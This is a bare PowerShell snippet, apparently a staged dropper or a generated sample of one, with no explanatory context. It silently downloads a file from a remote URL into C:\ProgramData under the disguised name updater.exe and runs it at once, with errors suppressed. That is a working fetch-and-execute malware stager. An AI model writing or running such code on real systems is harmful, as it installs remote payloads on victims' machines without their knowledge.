
try { $Stage1Url = "https://adatum.com/stage2.ps1"; $PayloadPath = 'C:\ProgramData\updater.exe'; curl.exe -s -L -o $PayloadPath $Stage1Url; Start-Process -FilePath $PayloadPath -ErrorAction SilentlyContinue; $StageMarker = "stage-38" } catch { Write-Warning "Remote fetch failed" }
